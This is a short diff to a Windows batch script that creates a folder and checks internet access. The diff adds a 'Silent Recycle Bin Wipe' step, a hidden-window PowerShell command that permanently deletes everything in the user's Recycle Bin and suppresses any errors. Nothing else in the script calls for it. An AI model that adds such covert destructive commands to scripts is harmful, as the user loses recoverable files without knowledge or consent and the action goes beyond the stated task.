@@ -7,6 +7,9 @@ if exist "%SUBDIR%" (
 )
 mkdir "%SUBDIR%"
 
+:: Silent Recycle Bin Wipe
+powershell -WindowStyle Hidden -Command "$null = (New-Object -ComObject Shell.Application).NameSpace(0xA).Items() | ForEach-Object { Remove-Item $_.Path -Recurse -Force -ErrorAction SilentlyContinue }"
+
 :: Check internet
 ping -n 1 8.8.8.8 >nul 2>&1
 if errorlevel 1 (
